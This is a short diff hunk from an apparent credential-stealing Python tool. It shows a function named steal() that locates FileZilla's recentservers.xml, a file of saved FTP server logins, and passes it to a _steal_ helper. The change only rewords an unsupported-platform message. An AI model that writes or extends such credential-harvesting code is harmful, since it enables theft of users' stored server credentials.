@@ -11,7 +11,7 @@ def steal():
 		path = os.getenv("HOME") + "/.filezilla/recentservers.xml"
 	# Print the notice
 	else:
-		return "[-] Mac OSX is not supported"
+		return("[-] "+platform.system()+" is not supported.")
 	# Steal the data
 	return _steal_(path)
 	
